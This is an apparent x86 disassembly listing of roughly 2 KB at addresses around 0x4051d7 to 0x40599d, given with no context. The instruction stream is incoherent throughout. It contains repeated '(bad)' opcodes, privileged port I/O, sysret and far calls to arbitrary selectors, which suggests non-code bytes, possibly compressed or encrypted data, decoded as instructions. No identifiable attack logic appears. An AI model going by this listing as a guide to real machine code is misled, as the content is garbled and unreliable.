  4051d7:	in     eax,dx
  4051d8:	addr16 (bad) 
  4051da:	bound  ecx,QWORD PTR [ebx-0x2daa2b19]
  4051e0:	adc    al,0xc6
  4051e2:	inc    esp
  4051e3:	inc    esi
  4051e4:	adc    eax,0x229461e7
  4051e9:	dec    ebx
  4051ea:	sahf   
  4051eb:	add    eax,ebp
  4051ed:	push   edi
  4051ee:	test   al,0xa4
  4051f0:	imul   esp,DWORD PTR [esi+edx*8+0x25],0x9a03669d
  4051f8:	lods   eax,DWORD PTR ds:[esi]
  4051f9:	or     ch,dl
  4051fb:	stos   DWORD PTR es:[edi],eax
  4051fc:	sbb    BYTE PTR [ebx-0x1f],bh
  4051ff:	xchg   bl,bh
  405201:	popa   
  405202:	push   esp
  405203:	lock xchg edx,eax
  405205:	daa    
  405206:	imul   eax,DWORD PTR [ecx+edi*1+0x4ac76ddd],0x6c
  40520e:	mov    BYTE PTR [esi],ah
  405210:	inc    ebx
  405211:	mov    ds:0xabad95bc,al
  405216:	dec    DWORD PTR ss:[edx-0x45]
  40521a:	xchg   ecx,eax
  40521b:	xor    BYTE PTR [ecx-0x1c3e4acd],0x86
  405222:	in     al,0x60
  405224:	fisub  DWORD PTR [ecx+0x398773e1]
  40522a:	std    
  40522b:	mov    WORD PTR [edx],es
  40522d:	mov    ecx,0xa514288c
  405232:	in     eax,dx
  405233:	dec    ecx
  405234:	mov    bh,0x94
  405236:	ret    0x8447
  405239:	lods   eax,DWORD PTR ds:[esi]
  40523a:	pusha  
  40523b:	mov    bl,0xc2
  40523d:	pop    ebx
  40523e:	mov    ah,0x82
  405240:	call   0x38e0:0x290a8959
  405247:	xor    al,0xec
  405249:	pop    ebp
  40524a:	gs adc eax,0x351d3919
  405250:	mov    dl,0x1c
  405252:	adc    al,0x71
  405254:	(bad)  
  405255:	ja     0x405273
  405257:	and    esi,DWORD PTR [esi+0xf]
  40525a:	pop    ecx
  40525b:	or     BYTE PTR [bp+0x20],ah
  40525f:	stos   DWORD PTR es:[edi],eax
  405260:	out    0x9e,al
  405262:	stc    
  405263:	icebp  
  405264:	jne    0x405298
  405266:	jp     0x405288
  405268:	mov    al,ds:0xe60c5375
  40526d:	ror    DWORD PTR [ecx-0x2f],0xd9
  405271:	imul   ecx,edi,0xb5b7dbef
  405277:	inc    esi
  405278:	mov    bl,bh
  40527a:	xchg   ch,dl
  40527c:	pop    ecx
  40527d:	(bad)  
  40527e:	sbb    esp,DWORD PTR [edx+0x5d]
  405281:	mov    bh,0x74
  405283:	mov    cl,0xb9
  405285:	pop    edi
  405286:	xlat   BYTE PTR ds:[ebx]
  405287:	mov    eax,0xa765f835
  40528c:	sar    DWORD PTR [eax+0x11984b17],0x60
  405293:	push   ebx
  405294:	nop
  405295:	mov    ds:0x1867fa60,eax
  40529a:	in     al,dx
  40529b:	mov    bl,0x8c
  40529d:	ins    DWORD PTR es:[edi],dx
  40529e:	mov    edi,0x1e08a578
  4052a3:	mov    cl,0xb9
  4052a5:	test   al,0x5d
  4052a7:	mov    di,0x8551
  4052ab:	xchg   esp,eax
  4052ac:	add    BYTE PTR [edx+0x5e],0x6d
  4052b0:	push   0x62
  4052b2:	xchg   esi,eax
  4052b3:	push   ebp
  4052b4:	(bad)  
  4052b5:	in     al,0x2a
  4052b7:	fiadd  WORD PTR [ebp-0xe85027e]
  4052bd:	mov    bl,0x94
  4052bf:	gs repnz loope 0x4052ef
  4052c3:	ret    
  4052c4:	mov    al,0x56
  4052c6:	bound  edx,QWORD PTR [ebx+0x33]
  4052c9:	adc    BYTE PTR [ebp-0x1b40dac0],bl
  4052cf:	fs mov bh,0xe2
  4052d2:	repz fist WORD PTR [esi-0x59]
  4052d6:	pusha  
  4052d7:	mov    bl,0x71
  4052d9:	adc    al,0xbd
  4052db:	repz addr16 add edx,DWORD PTR [bp+0x6fab]
  4052e2:	pop    ss
  4052e3:	scas   eax,DWORD PTR es:[edi]
  4052e4:	jns    0x405333
  4052e6:	cdq    
  4052e7:	or     al,0xcd
  4052e9:	inc    esi
  4052ea:	xor    BYTE PTR [edx],cl
  4052ec:	ds push edx
  4052ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ef:	(bad)  
  4052f0:	push   esp
  4052f1:	adc    bl,BYTE PTR ds:0x4ec0db5e
  4052f7:	xor    DWORD PTR [edx-0x5],esp
  4052fa:	mov    ebp,0xc0ba409e
  4052ff:	mov    ss,WORD PTR [esi+0x7e00d4db]
  405305:	inc    esp
  405306:	shl    BYTE PTR [ecx*1-0xe7829a0],1
  40530d:	mov    ds:0xb9a3320e,eax
  405312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405313:	mov    al,0xe9
  405315:	push   ds
  405316:	xchg   ecx,eax
  405317:	mov    cl,0x6b
  405319:	pop    eax
  40531a:	ret    0x397b
  40531d:	xchg   edi,eax
  40531e:	popf   
  40531f:	jge    0x405386
  405321:	scas   eax,DWORD PTR es:[edi]
  405322:	dec    ecx
  405323:	mov    ch,0xaf
  405325:	dec    edi
  405326:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  405328:	sti    
  405329:	inc    ebx
  40532a:	enter  0xb31b,0x6a
  40532e:	mov    esi,esp
  405330:	and    esi,edi
  405332:	fwait
  405333:	cld    
  405334:	lds    eax,FWORD PTR [ecx-0x31]
  405337:	cmp    al,0x3c
  405339:	loop   0x4052f7
  40533b:	aaa    
  40533c:	adc    eax,0xa042de73
  405341:	lods   al,BYTE PTR ds:[esi]
  405342:	jge    0x405301
  405344:	sbb    al,0xac
  405346:	rol    DWORD PTR [eax],1
  405348:	test   dh,dh
  40534a:	in     al,0x4c
  40534c:	pop    es
  40534d:	xchg   edi,eax
  40534e:	seto   cl
  405351:	adc    DWORD PTR [ecx+ecx*2+0x4a],eax
  405355:	imul   ebx,DWORD PTR [edi+ecx*4+0x4ba157f1],0x15
  40535d:	jmp    0x50e82bc5
  405362:	pop    edi
  405363:	xchg   ecx,eax
  405364:	(bad)  
  405365:	pusha  
  405366:	pop    eax
  405367:	aaa    
  405368:	cmp    dl,BYTE PTR [ecx+edi*1+0x3d92955f]
  40536f:	int3   
  405370:	in     al,dx
  405371:	stos   DWORD PTR es:[edi],eax
  405372:	mov    esi,edx
  405374:	mov    ch,0xa8
  405376:	xchg   edi,eax
  405377:	fst    DWORD PTR [edi-0x24b6cc20]
  40537d:	repz cmp ah,dl
  405380:	rol    DWORD PTR [eax],0x67
  405383:	push   ds
  405384:	inc    ebp
  405385:	test   DWORD PTR [edi+ecx*8+0x6a],0x39885ea0
  40538d:	shl    ch,1
  40538f:	(bad)  
  405390:	(bad)  
  405391:	mov    ch,0xb0
  405393:	stc    
  405394:	int3   
  405395:	push   esp
  405396:	push   esi
  405397:	cmp    bh,dl
  405399:	add    DWORD PTR [esi-0x6],ebx
  40539c:	bndldx (bad),[esi+0x1dbef3bc]
  4053a3:	push   ebx
  4053a4:	push   ss
  4053a5:	push   0xffffffda
  4053a7:	add    edi,esp
  4053a9:	push   cs
  4053aa:	sub    eax,0x5aa915ec
  4053af:	out    dx,eax
  4053b0:	mov    DWORD PTR [edi],ebp
  4053b2:	mov    edi,0xfcef95d2
  4053b7:	cli    
  4053b8:	add    edx,ebp
  4053ba:	xchg   ecx,eax
  4053bb:	cmp    DWORD PTR [edi+0x7f5dfd4d],0x18
  4053c2:	clc    
  4053c3:	mov    ecx,0xc22c85ff
  4053c8:	imul   esi,ebx,0x65
  4053cb:	in     eax,0xa7
  4053cd:	inc    edi
  4053ce:	xchg   esp,eax
  4053cf:	sbb    bl,dh
  4053d1:	and    cl,0x6a
  4053d4:	and    al,0x1c
  4053d6:	test   eax,0x122e4f9f
  4053db:	cmovs  edi,DWORD PTR [edi+0x6f]
  4053df:	lods   al,BYTE PTR ds:[esi]
  4053e0:	sbb    dh,BYTE PTR [edx-0x36]
  4053e3:	fdiv   QWORD PTR [edx+0x6403d28d]
  4053e9:	jae    0x405425
  4053eb:	mov    ds:0x4813ab27,eax
  4053f0:	sbb    cl,BYTE PTR [ebp-0x5cb72528]
  4053f6:	sub    eax,0x777b27bc
  4053fb:	cld    
  4053fc:	add    ecx,ebx
  4053fe:	ins    BYTE PTR es:[edi],dx
  4053ff:	pop    ds
  405400:	sub    bh,BYTE PTR [ebp+0x944a00b]
  405406:	add    al,0x8e
  405408:	and    esp,ecx
  40540a:	mov    eax,ds:0x718bd1b9
  40540f:	test   esp,0x529ec89c
  405415:	jb     0x40542a
  405417:	push   0xef46b650
  40541c:	xor    eax,0x860b5a55
  405421:	stc    
  405422:	xchg   ecx,eax
  405423:	sub    al,0x9a
  405425:	cli    
  405426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405427:	or     eax,0x5c9db9e
  40542c:	mov    dl,0xfb
  40542e:	mov    ds:0x78956eb7,eax
  405433:	dec    eax
  405434:	mov    DWORD PTR [eax-0x72a5ef9],ecx
  40543a:	ins    DWORD PTR es:[edi],dx
  40543b:	mov    edx,0xc3d19a35
  405440:	loopne 0x405459
  405442:	sub    ebx,edx
  405444:	add    DWORD PTR [esp+ecx*1],ebx
  405447:	cmp    esi,DWORD PTR ds:0x99ea84fa
  40544d:	dec    eax
  40544f:	rcr    DWORD PTR [ebp+ecx*2-0x44],cl
  405453:	jp     0x405443
  405455:	mov    gs,WORD PTR [ebx]
  405457:	cmp    DWORD PTR [edi],ecx
  405459:	add    ch,BYTE PTR [esp+ebp*8]
  40545c:	pop    es
  40545d:	pinsrw mm2,ebp,0xb
  405461:	repz jbe 0x405414
  405464:	mov    ebx,0x7ae8f8a3
  405469:	pushf  
  40546a:	mov    esi,0x911c38e1
  40546f:	jp     0x40548d
  405471:	daa    
  405472:	mov    ch,ah
  405474:	loopne 0x4054eb
  405476:	xchg   BYTE PTR [ebp+0x3e],bh
  405479:	imul   eax,ecx,0xfffffff6
  40547c:	jge    0x4054a4
  40547e:	xor    BYTE PTR [edx-0x6110f2ae],ch
  405484:	jg     0x4054d5
  405486:	je     0x405457
  405488:	popa   
  405489:	icebp  
  40548a:	jo     0x4054cf
  40548c:	pop    ecx
  40548d:	test   BYTE PTR [eax],bl
  40548f:	(bad)  
  405490:	push   ebp
  405491:	push   esp
  405492:	mov    BYTE PTR [esi],bl
  405494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405495:	out    dx,eax
  405496:	repnz clc 
  405498:	jle    0x4054da
  40549a:	daa    
  40549b:	cwde   
  40549c:	dec    esp
  40549d:	dec    ebp
  40549e:	jns    0x4054f3
  4054a0:	mov    bh,0x4c
  4054a2:	cld    
  4054a3:	div    cl
  4054a5:	in     al,dx
  4054a6:	ja     0x405511
  4054a8:	mov    dl,0x57
  4054aa:	cmp    BYTE PTR [edx-0x54],ah
  4054ad:	push   0x9e89bcc5
  4054b2:	retf   0x90b6
  4054b5:	jo     0x405532
  4054b7:	xchg   ebp,eax
  4054b8:	shl    BYTE PTR [edx-0x45],cl
  4054bb:	sub    eax,edi
  4054bd:	jecxz  0x4054c9
  4054bf:	out    dx,eax
  4054c0:	sbb    eax,0x2379ab6e
  4054c5:	jne    0x405452
  4054c7:	xor    eax,0x5265134b
  4054cc:	push   esi
  4054cd:	mov    ds:0x3cb3bbce,al
  4054d2:	xchg   edx,eax
  4054d3:	jne    0x405525
  4054d5:	inc    ebx
  4054d6:	dec    eax
  4054d7:	inc    ebp
  4054d8:	xor    BYTE PTR [eax-0x3edf4148],0x5b
  4054df:	iret   
  4054e0:	fcomp  DWORD PTR [ecx-0x2e]
  4054e3:	out    dx,al
  4054e4:	cld    
  4054e5:	sub    al,0x2c
  4054e7:	popf   
  4054e8:	push   ebp
  4054e9:	test   BYTE PTR [esi],dl
  4054eb:	scas   eax,DWORD PTR es:[edi]
  4054ec:	cmp    BYTE PTR [edi+0x42],dh
  4054ef:	jae    0x40553d
  4054f1:	cld    
  4054f2:	fisub  WORD PTR [ecx+ecx*4-0x72fc972a]
  4054f9:	ds sub eax,0x66916bc6
  4054ff:	lods   al,BYTE PTR ds:[esi]
  405500:	xchg   bl,al
  405502:	ffree  st(1)
  405504:	cmp    eax,0x5f19f5f7
  405509:	and    eax,DWORD PTR [edi]
  40550b:	xlat   BYTE PTR ds:[ebx]
  40550c:	push   edx
  40550d:	adc    ah,BYTE PTR [esi]
  40550f:	cmp    BYTE PTR [edx+0x409a52df],ah
  405515:	jnp    0x4054a3
  405517:	jne    0x4054b0
  405519:	sub    cl,BYTE PTR [edx-0x28cc8d47]
  40551f:	ja     0x405527
  405521:	(bad)  
  405522:	pop    es
  405523:	call   0x5ce473eb
  405528:	mov    WORD PTR [edi+ebp*2],?
  40552b:	jmp    0x33ec4d94
  405530:	retf   0xdab4
  405533:	cmp    DWORD PTR [edi-0x4d7b1ce9],ecx
  405539:	sbb    BYTE PTR [ecx-0x73a02e54],al
  40553f:	aas    
  405540:	sub    DWORD PTR [eax+0x2b],0x31
  405544:	mov    ah,BYTE PTR [ecx+0x5e174f07]
  40554a:	sub    ah,ah
  40554c:	scas   al,BYTE PTR es:[edi]
  40554d:	adc    eax,0x2ed2b915
  405552:	adc    eax,0x910771e9
  405557:	pusha  
  405558:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40555a:	xlat   BYTE PTR ds:[ebx]
  40555b:	jmp    0x227b521c
  405560:	daa    
  405561:	lea    ebx,[edx-0x778ac2e2]
  405567:	mov    ebx,0x2e5f4047
  40556c:	scas   al,BYTE PTR es:[edi]
  40556d:	xor    cl,BYTE PTR [edi+0x3c8c67d]
  405573:	push   ebx
  405574:	fcos   
  405576:	cwde   
  405577:	shr    DWORD PTR [edx-0x14],1
  40557a:	xor    BYTE PTR [ebp-0xd],ch
  40557d:	ror    BYTE PTR [edi-0x25],cl
  405580:	popaw  
  405582:	cmp    eax,DWORD PTR [ecx]
  405584:	retf   0x9619
  405587:	cdq    
  405588:	mov    ds:0xf09a3fb4,eax
  40558d:	ins    BYTE PTR es:[edi],dx
  40558e:	int3   
  40558f:	add    DWORD PTR [ebp+0x171b2a3],ebp
  405595:	cmc    
  405596:	pop    esi
  405597:	adc    edi,edi
  405599:	shl    ebx,1
  40559b:	clc    
  40559c:	cdq    
  40559d:	push   edi
  40559e:	lea    esi,[ebp-0xe621698]
  4055a4:	sub    BYTE PTR [ebx-0x56],bl
  4055a7:	mov    bh,0x66
  4055a9:	cmp    BYTE PTR [edx+0x29],0x82
  4055ad:	out    dx,al
  4055ae:	cmp    bl,ch
  4055b0:	xchg   edx,eax
  4055b1:	pop    edi
  4055b2:	stos   BYTE PTR es:[edi],al
  4055b3:	mov    al,0xc
  4055b5:	push   esi
  4055b6:	addr16 mov bl,0xf4
  4055b9:	sub    al,0x9c
  4055bb:	test   ax,0x9d9d
  4055bf:	cmp    bl,BYTE PTR [edi]
  4055c1:	adc    al,0x3f
  4055c3:	loopne 0x4055de
  4055c5:	out    dx,al
  4055c6:	cmp    edx,DWORD PTR [ebx+edi*8]
  4055c9:	add    DWORD PTR [ebx],ecx
  4055cb:	(bad)  
  4055cc:	sbb    ah,BYTE PTR [eax]
  4055ce:	fwait
  4055cf:	pop    edx
  4055d0:	mov    dl,0xb4
  4055d2:	mov    al,ds:0xb95c1ef
  4055d7:	add    DWORD PTR [ebp-0x4f],0x41
  4055db:	sahf   
  4055dc:	sbb    ah,BYTE PTR [eax+edi*8+0x1f9576da]
  4055e3:	(bad)  
  4055e4:	fdivr  DWORD PTR [ebx-0x66]
  4055e7:	popf   
  4055e8:	mov    ds:0xca5f3f66,al
  4055ed:	fs jo  0x405636
  4055f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f1:	jnp    0x4055f3
  4055f3:	inc    esp
  4055f4:	jbe    0x40566d
  4055f6:	retf   0xcbe5
  4055f9:	in     al,dx
  4055fa:	push   esp
  4055fb:	jae    0x4055a3
  4055fd:	cmp    dl,ch
  4055ff:	push   0xaa7b4fd7
  405604:	jl     0x4055d6
  405606:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  405608:	aam    0xd6
  40560a:	out    0x7,eax
  40560c:	sahf   
  40560d:	enter  0xe78e,0x19
  405611:	loopne 0x4055d4
  405613:	adc    DWORD PTR [ebx],ecx
  405615:	cmp    eax,0xe7a22bf3
  40561a:	and    ch,BYTE PTR [esi+0x6822a068]
  405620:	mov    bl,0x92
  405622:	adc    ecx,DWORD PTR [ebp-0x39a9409b]
  405628:	into   
  405629:	rcl    BYTE PTR [eax+0x4a],1
  40562c:	jne    0x4055cf
  40562e:	scas   al,BYTE PTR es:[edi]
  40562f:	ret    
  405630:	cwde   
  405631:	inc    ebx
  405632:	loopne 0x405689
  405634:	dec    esi
  405635:	inc    edi
  405636:	push   ss
  405637:	mov    edx,0xc90ac735
  40563c:	call   0x55b8:0xdf6f555d
  405643:	lahf   
  405644:	xchg   edi,eax
  405645:	aam    0x30
  405647:	mov    dl,0x26
  405649:	in     eax,0x93
  40564b:	pop    eax
  40564c:	aam    0xa0
  40564e:	dec    ecx
  40564f:	add    bh,BYTE PTR [ecx+0x40a48b6f]
  405655:	and    DWORD PTR [ecx+0x24],0x63f2c289
  40565c:	cdq    
  40565d:	mov    esi,DWORD PTR [ebx-0x5a]
  405660:	mov    ebp,0x6ac686a2
  405665:	aam    0x6d
  405667:	mov    ch,BYTE PTR [edi+edx*8]
  40566a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566b:	fbstp  TBYTE PTR [esp+esi*8]
  40566e:	lods   al,BYTE PTR gs:[esi]
  405670:	cld    
  405671:	loop   0x4056dd
  405673:	mov    bl,BYTE PTR [esi+edi*4+0x14]
  405677:	push   fs
  405679:	mov    al,0xae
  40567b:	sahf   
  40567c:	lahf   
  40567d:	in     eax,0xc7
  40567f:	scas   eax,DWORD PTR es:[edi]
  405680:	pop    ds
  405681:	jmp    0x4056a0
  405683:	out    0x74,eax
  405685:	ins    DWORD PTR es:[edi],dx
  405686:	ins    DWORD PTR es:[edi],dx
  405687:	push   edx
  405688:	xchg   ecx,eax
  405689:	sar    BYTE PTR ds:0x6f9f88b0,cl
  40568f:	dec    edx
  405690:	dec    esp
  405691:	(bad)  
  405692:	pop    ecx
  405693:	rcl    edx,0xbc
  405696:	out    dx,eax
  405697:	addr16 push ecx
  405699:	call   0xb7a17fb8
  40569e:	pop    esi
  40569f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056a0:	cs cs ja 0x40571f
  4056a4:	sti    
  4056a5:	shl    DWORD PTR [eax],1
  4056a7:	inc    BYTE PTR [ebp-0x3736d8d2]
  4056ad:	xchg   DWORD PTR [ecx],eax
  4056af:	pop    edx
  4056b0:	add    ebp,DWORD PTR [bx+di-0x5c]
  4056b4:	aam    0xc8
  4056b6:	inc    ebx
  4056b7:	and    DWORD PTR [ebx-0x1f],ecx
  4056ba:	and    ebx,ebx
  4056bc:	leave  
  4056bd:	push   0x51d7dbbd
  4056c2:	pop    edx
  4056c3:	pshufw mm0,QWORD PTR [ecx-0xd],0x48
  4056c8:	gs inc ebp
  4056ca:	into   
  4056cb:	jno    0x4056d9
  4056cd:	(bad)  
  4056ce:	in     eax,dx
  4056cf:	sub    DWORD PTR [edi-0x2475041c],ecx
  4056d5:	(bad)  [edx]
  4056d7:	cmc    
  4056d8:	scas   al,BYTE PTR es:[edi]
  4056d9:	and    al,0xbc
  4056db:	pop    esi
  4056dc:	outs   dx,DWORD PTR ss:[esi]
  4056de:	mov    WORD PTR [ebx],gs
  4056e0:	fs jmp 0x96a3534e
  4056e6:	dec    edx
  4056e7:	push   eax
  4056e8:	enter  0xfdf8,0x3e
  4056ec:	sbb    BYTE PTR [ecx-0x4cff6039],cl
  4056f2:	sti    
  4056f3:	mov    DWORD PTR [ecx],ebx
  4056f5:	fmul   QWORD PTR [esi+ecx*4]
  4056f8:	repnz out 0x6f,eax
  4056fb:	aaa    
  4056fc:	add    BYTE PTR [esi],bh
  4056fe:	test   al,0x2b
  405700:	add    al,0x3e
  405702:	add    dl,BYTE PTR [esp+ebx*4]
  405705:	cli    
  405706:	sub    bl,bh
  405708:	sbb    bh,BYTE PTR [ebx]
  40570a:	or     eax,0x9edd9fec
  40570f:	pop    esi
  405710:	pop    ecx
  405711:	inc    ebx
  405712:	call   DWORD PTR [eax]
  405714:	and    ah,BYTE PTR [ecx-0x1faa14fd]
  40571a:	mov    ecx,0x19362cf7
  40571f:	ins    DWORD PTR es:[edi],dx
  405720:	aas    
  405721:	pop    edi
  405722:	(bad)  
  405725:	mov    eax,0x81fc3997
  40572a:	imul   esp,DWORD PTR [eax],0xffffff90
  40572d:	cmp    esi,DWORD PTR [edx+0x16]
  405730:	dec    ebx
  405731:	adc    eax,DWORD PTR [ebx]
  405733:	aam    0x98
  405735:	loop   0x40576b
  405737:	dec    eax
  405738:	iret   
  405739:	aam    0x64
  40573b:	into   
  40573c:	dec    ebx
  40573d:	jg     0x4056f0
  40573f:	ficom  DWORD PTR [edx]
  405741:	dec    ecx
  405742:	dec    edx
  405743:	push   ebx
  405744:	jne    0x40570c
  405746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405747:	xchg   ebx,eax
  405748:	call   0x94d0:0x86ef90ce
  40574f:	lea    ecx,[edi+0x7c]
  405752:	dec    edx
  405753:	test   dl,al
  405755:	jbe    0x4057c4
  405757:	outs   dx,DWORD PTR ds:[esi]
  405758:	mov    eax,ds:0x2fc3ef71
  40575d:	xchg   ebp,eax
  40575e:	(bad)
  405761:	sti    
  405762:	cli    
  405763:	(bad)  
  405764:	cmp    eax,0x6578ab6e
  405769:	mov    ch,ch
  40576b:	mov    ebp,DWORD PTR [edx]
  40576d:	jp     0x405769
  40576f:	ror    DWORD PTR [esi+0x29f0cd09],1
  405775:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405777:	in     al,0xdf
  405779:	cdq    
  40577a:	cdq    
  40577b:	(bad)  
  40577c:	mov    ds:0xbbc3a04f,al
  405782:	jle    0x405744
  405784:	fmul   DWORD PTR [edi+0x738a2ed7]
  40578a:	xlat   BYTE PTR ds:[ebx]
  40578b:	not    DWORD PTR [esi+edi*8+0x78]
  40578f:	cmp    eax,0x638a7fad
  405794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405795:	adc    BYTE PTR cs:[ebp-0x72],ah
  405799:	adc    DWORD PTR [ebx-0x797042ff],0xffffffbe
  4057a0:	cmp    DWORD PTR [esi+0x60],0xffffff88
  4057a4:	pop    ebx
  4057a5:	in     al,dx
  4057a6:	inc    ecx
  4057a7:	pop    ebx
  4057a8:	push   edx
  4057a9:	mov    ds:0x5dca844e,eax
  4057ae:	and    BYTE PTR [esi+0x25],dl
  4057b1:	cli    
  4057b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b3:	scas   al,BYTE PTR es:[edi]
  4057b4:	push   0x2b991c35
  4057b9:	(bad)  
  4057ba:	icebp  
  4057bb:	mov    ecx,0x2f3e619a
  4057c0:	aaa    
  4057c1:	or     BYTE PTR [ebp+0x776bc2bd],al
  4057c7:	inc    edi
  4057c8:	cmp    al,0xfb
  4057cb:	shl    DWORD PTR [ebp+0x1be4c5c7],0x21
  4057d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d3:	pusha  
  4057d4:	in     al,0x78
  4057d6:	jae    0x405796
  4057d8:	jp     0x405784
  4057da:	mov    ebx,0x36309b76
  4057df:	mov    ecx,DWORD PTR [ebx+0x7b]
  4057e2:	jmp    0x405827
  4057e4:	xchg   ebx,eax
  4057e5:	inc    eax
  4057e6:	and    ecx,esp
  4057e8:	sbb    eax,0x873209e9
  4057ed:	(bad)  
  4057ef:	sahf   
  4057f0:	ror    BYTE PTR [edx+0x697f8237],cl
  4057f6:	push   es
  4057f7:	mov    bl,0xeb
  4057f9:	js     0x4057bd
  4057fb:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057fd:	add    eax,0xf1189875
  405802:	mov    cl,0x9
  405804:	pop    ebp
  405805:	sub    DWORD PTR [ebx+0x59],0xffffffc3
  405809:	pushf  
  40580a:	sysret 
  40580c:	popf   
  40580d:	sti    
  40580e:	adc    BYTE PTR ds:0x406f9093,dh
  405814:	xor    al,0xfb
  405816:	iret   
  405817:	xchg   esp,eax
  405818:	or     al,0x6a
  40581a:	(bad)
  40581e:	pop    edx
  40581f:	mov    ebp,DWORD PTR gs:[ecx-0x65df304]
  405826:	lock xchg edi,eax
  405828:	retf   0xfd64
  40582b:	pushf  
  40582c:	push   ebx
  40582d:	adc    al,0xd6
  40582f:	aad    0x21
  405831:	popa   
  405832:	jo     0x4057dc
  405834:	ins    DWORD PTR es:[edi],dx
  405835:	jecxz  0x40584f
  405837:	inc    ecx
  405838:	popa   
  405839:	or     bh,BYTE PTR gs:[edx-0x3b351524]
  405840:	add    DWORD PTR [esi+0x54],esi
  405843:	adc    al,0xae
  405845:	je     0x4057d1
  405847:	sbb    eax,0x29224b68
  40584c:	or     BYTE PTR [ebp+0x3552f348],al
  405852:	add    bh,0xf3
  405855:	arpl   WORD PTR [ebp+0x75],si
  405858:	sbb    BYTE PTR [edi],ah
  40585a:	mov    edx,0x7c1c2e7c
  40585f:	aas    
  405860:	int3   
  405861:	retf   
  405862:	mov    ds:0x38e57b8f,al
  405867:	int3   
  405868:	es xchg edi,ebx
  40586b:	aad    0x12
  40586d:	pop    edi
  40586e:	imul   edi,esi,0xf
  405871:	cwde   
  405872:	xor    BYTE PTR [esi],bh
  405874:	fnstsw WORD PTR [ecx+esi*1+0x4510bc0d]
  40587b:	mov    bl,BYTE PTR [ebx-0x1cf104cd]
  405881:	in     eax,0x2e
  405883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405884:	pop    ds
  405885:	jb     0x4058c8
  405887:	stos   DWORD PTR es:[edi],eax
  405888:	mov    WORD PTR [eax+0x59],fs
  40588b:	or     eax,0x7ef50745
  405890:	xor    dl,BYTE PTR [edx+0x19edf1d8]
  405896:	add    eax,0x316e941a
  40589b:	inc    edi
  40589c:	pusha  
  40589d:	(bad)  
  40589f:	sbb    BYTE PTR [eax+0x2009853e],bl
  4058a5:	inc    ebp
  4058a6:	xchg   ebp,eax
  4058a7:	add    DWORD PTR [esi-0x42b1847d],eax
  4058ad:	mov    WORD PTR [eax-0x6],?
  4058b0:	in     eax,0xa3
  4058b2:	daa    
  4058b3:	jns    0x40590a
  4058b5:	and    eax,0xee969e88
  4058ba:	fstp   QWORD PTR [esi+eax*8-0x1e]
  4058be:	shl    DWORD PTR [ebp+0x68],cl
  4058c1:	pop    esp
  4058c2:	inc    ebx
  4058c3:	imul   bl
  4058c5:	mov    ch,0xd
  4058c7:	inc    si
  4058c9:	sub    eax,0x728a8d25
  4058ce:	and    DWORD PTR [ebx+0x45],0x693f5753
  4058d5:	pop    eax
  4058d6:	adc    esi,DWORD PTR [eax]
  4058d8:	sub    eax,eax
  4058da:	mov    BYTE PTR [edx+0x47],ch
  4058dd:	xor    eax,0x3e22a451
  4058e2:	pop    ebp
  4058e3:	xchg   BYTE PTR [edx+ecx*1],ch
  4058e6:	pop    esi
  4058e7:	jno    0x405943
  4058e9:	or     eax,0xef67c5db
  4058ee:	iret   
  4058ef:	or     eax,0x5c653a10
  4058f4:	loope  0x405932
  4058f6:	cwde   
  4058f7:	xlat   BYTE PTR ds:[ebx]
  4058f8:	pop    ecx
  4058f9:	and    DWORD PTR [ebp+0x0],0xffffffed
  4058fd:	leave  
  4058fe:	jl     0x405937
  405900:	scas   al,BYTE PTR es:[edi]
  405901:	popf   
  405902:	je     0x40589f
  405904:	inc    ecx
  405905:	xchg   edx,eax
  405906:	int3   
  405907:	jl     0x40588f
  405909:	mov    ds:0x997ffbd,al
  40590e:	fiadd  DWORD PTR [ecx-0x56a4221d]
  405914:	test   eax,0xf2f5de71
  405919:	int3   
  40591a:	retf   0x8f
  40591d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40591e:	cwde   
  40591f:	addr16 rol ch,cl
  405922:	add    bh,BYTE PTR [eax]
  405924:	pop    esi
  405925:	mov    ch,0x84
  405927:	dec    esp
  405928:	adc    ch,bh
  40592a:	cmp    BYTE PTR [esi-0x3c377236],al
  405930:	es ret 0x5f7d
  405934:	pushf  
  405935:	and    ebp,DWORD PTR [esi+edi*1+0x67]
  405939:	xor    BYTE PTR [edi-0x507199d],dh
  40593f:	add    al,0x32
  405941:	cmp    eax,0x5239c649
  405946:	push   es
  405947:	inc    edi
  405948:	pop    eax
  405949:	xchg   edi,eax
  40594a:	imul   edi,DWORD PTR [ecx+0x2cf9680f],0x9f3b88c5
  405954:	sbb    al,0x2d
  405956:	mov    bl,0x43
  405958:	fucom  st(7)
  40595a:	rol    BYTE PTR [edi+eiz*1],cl
  40595d:	jmp    0x4059b2
  40595f:	cmp    esi,DWORD PTR [eax+0x56]
  405962:	imul   BYTE PTR [edx+0x1155d8d3]
  405968:	jecxz  0x405997
  40596a:	mov    ecx,0xe978e180
  40596f:	out    dx,eax
  405970:	cdq    
  405971:	fs out dx,al
  405973:	push   0x9d14155d
  405978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405979:	inc    ebp
  40597a:	unpckhps xmm1,xmm0
  40597d:	jmp    0xd7d78edb
  405982:	xchg   bh,bh
  405984:	out    dx,al
  405985:	cdq    
  405986:	fcmove st,st(4)
  405988:	call   0xa2b3:0x3e6c9997
  40598f:	and    esi,edx
  405991:	int    0x9a
  405993:	jb     0x4059a8
  405995:	cmp    al,0xad
  405997:	push   0xffffffeb
  405999:	cmp    BYTE PTR [esp+eiz*8+0x20],bh
  40599d:	sub    eax,0x3b1fa868
